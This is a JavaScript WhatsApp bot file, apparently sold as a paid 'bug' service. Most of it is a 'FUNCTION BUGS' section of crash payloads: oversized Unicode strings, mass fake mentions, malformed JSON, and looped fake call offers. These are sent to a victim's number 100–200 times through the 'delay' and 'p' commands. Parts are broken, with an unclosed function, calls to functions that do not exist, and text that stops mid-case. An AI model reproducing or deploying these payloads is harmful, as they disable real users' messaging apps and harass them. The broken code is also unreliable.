require('./setting')
if (typeof global.packname === 'undefined') global.packname = 'KaitoInvictusBot';
if (typeof global.author === 'undefined') global.author = 'YussOfficial';
const axios = require('axios');
const crypto = require('crypto');
function generateMessageID() {
  return (Math.random() * 1e20).toString(36);
}
function generateRandomMessageId() {
return Math.random().toString(36).substring(2, 15) + 
Math.random().toString(36).substring(2, 15);
}
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const path = require('path');
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/function');
module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
const botNumber = await sock.decodeJid(sock.user.id);
const premuser = JSON.parse(fs.readFileSync("./database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!sock.public && !isCreator) return;
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
if (m.message) {
sock.readMessages([m.key]);
sock.readMessages([m.key]);
console.log(`
▣ ⪼ 💬 New Message ⪻
│ Message From : ${m.pushName}
│ Place : ${groupName || "Private Chat"}
│ Message : ${body || m?.mtype || "Unknown"}
│ Jid : ${m.sender}
╰─────────────────────────▣`);}
function createSerial(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res?.duration == 0) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res?.wmplay || "/undefined",
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res?.play || "/undefined",
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res?.hdplay || "/undefined"
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			
		}
	});
}
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

const capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `VOID VERSE`,
                    body: `© Ikram Developer`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: "https://c.top4top.io/p_3693uh6561.jpg", 
                    sourceUrl: `https://t.me/IkramNotDev`
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
//=====( FUNCTION BUGS )=====\\
async function Xnullcrashprivat(target) {
    const msg = await generateWAMessageFromContent(
    target,
    {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                         degreesLatitude: -121211,
                         degreesLongitude: 4342221,
                         name: "𝐗͢𝐧𝐮𝐥𝐥༑ 𝐓𝐫𝐚𝐯͢𝐚𝐬⌜𖣂⌟ 𝐋𝐨͉𝐜𝐚𝐭𝐢𝐨𝐧༑⃟꙳",
                         address: "𝐗͢𝐧𝐮𝐥𝐥༑ 𝐓𝐫𝐚𝐯͢𝐚𝐬⌜𖣂⌟ 𝐋𝐨͉𝐜𝐚𝐭𝐢𝐨𝐧༑⃟꙳"
                         },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐗͢𝐧𝐮𝐥𝐥༑ 𝐓𝐫𝐚𝐯͢𝐚𝐬⌜𖣂⌟ 𝐋𝐨͉𝐜𝐚𝐭𝐢𝐨𝐧༑⃟꙳\n" + "ꦽ".repeat(92000) + "꧀".repeat(92000) + '@5'.repeat(92000)
                    },
                    nativeFlowMessage: {
                       buttons: [
                                {
                                  name: "single_select",
                                  buttonParamsJson: "𝐗͢𝐧𝐮𝐥𝐥༑ 𝐓𝐫𝐚𝐯͢𝐚𝐬⌜𖣂⌟ 𝐋𝐨͉𝐜𝐚𝐭𝐢𝐨𝐧༑⃟꙳〽️",
                                },
                                {
                                  name: "call_permission_request",
                                  buttonParamsJson: "𝐗͢𝐧𝐮𝐥𝐥༑ 𝐓𝐫𝐚𝐯͢𝐚𝐬⌜𖣂⌟ 𝐋𝐨͉𝐜𝐚𝐭𝐢𝐨𝐧༑⃟꙳〽️",
                                }, 
                                {
                                  name: "payment_method",
                                  buttonParamsJson: "",
                                },
                                {
                                  name: "payment_status",
                                  buttonParamsJson: "",
                                },
                                {
                                  name: "review_order",
                                  buttonParamsJson: "",
                                },
                                {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                           ],
                    },
                    contextInfo: {
              remoteJid: "X",
              participant: "13135550202@s.whatsapp.net",
              fromMe: false,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: 7205,
                },
              },
             },
            },
           },
          },
         },
        {}
    );
    await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
async function ZenoBlankNew(target) {
  const X = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "13535516@g.us",
            inviteCode: "XxX",
            inviteExpiration: "1",
            groupName: "🦠</🧬⃟༑⌁𝗫 - 𝗭 𝗘 𝗡 𝗢" +
              "ꦽ".repeat(25000) +
              "ោ៝".repeat(20000) +
              "@5".repeat(50000),
            caption: "\n",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          },
          interactiveMessage: {
            header: {
              title: "ោ៝".repeat(20000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
          },
          body: {
            text: "\n",
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, X.message, {
    messageId: X.key.id,
    participant: { jid: target },
  });
}
async function Hardcore(sock, target) {
  var parse = true;
  var SID = "5e03e0";
  var key = "10000000_2203140470115547_947412155165083119_n.enc";
  var Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  var type = `application/was`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  var Hardcore = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 9999,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };
  
  var Hardcore2 = await generateWAMessageFromContent(target, Hardcore, {});
  await sock.relayMessage("status@broadcast", Hardcore2.message, {
    messageId: Hardcore2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function fcinvis(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let Raza = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = sock.createParticipantNodes.bind(sock);
let Cyber = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return Raza.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}
//===== COMBO NYA =======\\
async function andronih(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}
//========= COMBO LAGI ==========\\
async function crashnotif(sock, target) {
  if (!sock || !target) {
    return;
  }
  const VoidSystemPayload = "VOID - VERSE" +
    "ꦽ".repeat(10000) +
    "𑇂𑆵𑆴𑆿".repeat(10000) +
    "꙰⃟".repeat(10000) +
    "\u0000".repeat(10000) +
    "𑜦𑜠".repeat(10000);
  try {
    const XandroidUi = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false
            },
            body: {
              text: "VOID - VERSE?"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "VOID", 
                    url: "https://" + "𑜦𑜠".repeat(5000) + ".com" 
                  })
                }
              ]
            },
            contextInfo: {
              externalAdReply: {
                renderLargerThumbnail: false,
                showAdAttribution: false
              }
            }
          }
        }
      }
    };
    try {
      await sock.relayMessage(target, XandroidUi, {
        messageId: sock.generateMessageTag()
      });
      console.log(`done`);
    } catch (sendError) {
      console.error(`ga:`, sendError.message);
    }
    console.log(`done`);
  } catch (error) {
    console.error(`ga:`, error.message);
  }
}
//=====( END FUNCTION BUGS )=====\\
//=====( SWITCH COMMAND )=====\\
switch (command) {
case "delay":{
if (!isPremium) {
  const noAccess = {
text: `*[ ! ] ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴘᴀᴋᴀɪ ᴏʟᴇʜ ᴍᴜʀʙᴜɢ*`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝗩𝗢𝗜𝗗 𝗩𝗘𝗥𝗦𝗘 🩸",
                    newsletterJid: `120363402452472439@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "𝗩𝗢𝗜𝗗 𝗩𝗘𝗥𝗦𝗘 𝗩𝟯𝟰 🩸",
        body: "𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝚄𝙶 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 🩸",
        mediaType: 1,
        thumbnailUrl: 'https://c.top4top.io/p_3693uh6561.jpg',
        sourceUrl: 'https://t.me/IkramNotDev'
      }
    }
  };
  return sock.sendMessage(m.chat, noAccess, { quoted: m });
}      
if (!text) {
  const Example = {
    text: `*[ ! ] ғᴏʀᴍᴀᴛ sᴀʟᴀʜ, ᴄᴏɴᴛᴏʜ :*
${prefix+command} 628xxxxx`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, Example, { quoted: m });
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
const itsmenu = `┌─❀
│☇ *Pengirim* : ${m.pushName}
│☇ *Type Bug* : ${command}
│☇ *Status* : Vip Buy Only!
│☇ *Developer* : YussOfficial
└─❀`;
let buttonMessage = {
  image: { url: 'https://files.catbox.moe/oxxf0b.jpg' },
  caption: itsmenu,
  contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
    externalAdReply: {
      showAdAttribution: true,
      title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
      body: 'YussOfficial & Iqbal',
      mediaType: 1,
      thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
      sourceUrl: 'https://bit.ly'
    }
  },
  footer: "YT YussOfficial || ID",
  headerType: 6
}
await sock.sendMessage(m.chat, buttonMessage, { quoted: m });
          for (let i = 0; i < 100; i++) {
              await BlankingHard(sock, target);
              await sleep(100);
}  
}
break;
//=====( CASE BUG DITEMPAT )=====\\
case "p":{
  if (!isPremium) {
    const noAccess = {
      text: `• Fitur Khusus User Premium!`,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
          newsletterName: "</> Kaito Invictus </>",
          newsletterJid: `120363403934813658@newsletter` 
        },
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
          body: "YussOfficial & Iqbal",
          mediaType: 1,
          thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
          sourceUrl: 'https://bit.ly'
        }
      }
    };
    return sock.sendMessage(m.chat, noAccess, { quoted: m });
  }      

  // 🔥 target otomatis = room chat sekarang
  let target = m.chat;

  const itsmenu = `┌─❀
│☇ *Pengirim* : ${m.pushName}
│☇ *Type Bug* : ${command}
│☇ *Status* : Vip Buy Only!
│☇ *Developer* : YussOfficial
└─❀`;

  let buttonMessage = {
    image: { url: 'https://files.catbox.moe/a64bhn.jpeg' },
    caption: itsmenu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardedNewsletterMessageInfo: {
        newsletterName: "</> Kaito Invictus </>",
        newsletterJid: `120363403934813658@newsletter` 
      },
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: '</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>',
        body: 'YussOfficial & Iqbal',
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    },
    footer: "YT YussOfficial || ID",
    headerType: 6
  };

  await sock.sendMessage(m.chat, buttonMessage, { quoted: m });

  // 🔥 langsung spam bug ke target chat
  for (let i = 0; i < 200; i++) {
      await lynForce(sock, target);
      await sleep(1000);
  }  
}
break;
case "aloo":{
  if (!isPremium) {
    const noAccess = {
      text: `• Fitur Khusus User Premium!`,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
          newsletterName: "</> Kaito Invictus </>",
          newsletterJid: `120363403934813658@newsletter` 
        },
        isForwarded: true,
